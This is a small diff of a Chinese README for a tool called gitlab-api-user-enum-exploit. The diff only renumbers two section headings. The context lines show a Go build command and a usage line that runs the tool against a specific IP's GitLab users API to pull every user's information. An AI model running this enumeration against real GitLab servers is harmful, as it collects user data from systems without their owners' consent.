@@ -46,7 +46,7 @@ SET GOARCH=amd64
 go build -o gitlab-api-user-enum-exploit.exe main.go
 ```
 
-# 二、使用案例
+# 三、使用案例
 
 拖所有用户的信息，后面的用户id`1`具体是几不重要，只要是个数字就可以：
 
@@ -54,7 +54,7 @@ go build -o gitlab-api-user-enum-exploit.exe main.go
 gitlab-api-user-enum-exploit.exe run --api-url https://202.191.66.163/api/v4/users/1 --output-by-domain
 ```
 
-# 三、使用文档
+# 四、使用文档
 
 ```text
 Usage：
